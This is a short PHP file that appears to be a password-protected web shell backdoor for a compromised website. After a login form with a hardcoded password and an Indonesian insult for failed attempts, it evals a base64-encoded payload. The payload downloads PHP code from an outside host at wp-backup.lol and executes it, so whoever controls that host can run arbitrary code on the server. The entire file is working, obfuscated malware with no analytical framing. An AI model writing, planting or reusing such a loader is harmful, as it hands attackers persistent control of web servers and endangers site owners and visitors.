<?php
session_start();
$ewean = 'dudakeren';

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $ewean) {
            $_SESSION['authenticated'] = true;
        } else {
            echo "COBA LAGI KONTOL!";
        }
    }

    if (!isset($_SESSION['authenticated'])) {
        echo '<form method="post">';
        echo 'Password: <input type="password" name="password">';
        echo '<input type="submit" value="Login">';
        echo '</form>';
        exit;
    }
}
?>
<?php eval("?>".base64_decode("PD9waHAgDQokdXJsID0gImh0dHBzOi8vd3AtYmFja3VwLmxvbC9qYW5nYW5vbS9kb3IvbmdhcmVwLnR4dCI7DQokY2ggPSBjdXJsX2luaXQoJHVybCk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsNCmV2YWwoIj8+Ii4kcmVzdWx0KTsNCg0KPz4=")); ?>a
